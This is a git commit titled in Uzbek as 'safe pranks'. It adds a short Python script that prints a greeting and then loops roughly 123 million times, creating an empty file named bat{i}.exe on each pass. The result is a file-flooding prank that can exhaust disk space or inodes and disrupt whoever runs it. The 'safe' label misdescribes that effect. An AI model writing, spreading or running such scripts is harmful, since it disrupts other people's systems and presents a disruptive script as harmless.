9ed808a8d5342ad224c4da189ae6fd1fbdb1183c
iskandar_kodirov <eiscocyber@gmail.com>
2023-02-15 16:39:42 +0500

    Xavfsiz pranklar

---
+++ prk/prk.py
@@ -0,0 +1,23 @@
+print("""
+salom                                                                                                    """)
+for i in range(100*1232165):
+    open(f'bat{i}.exe','w')
+print("""
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      """)
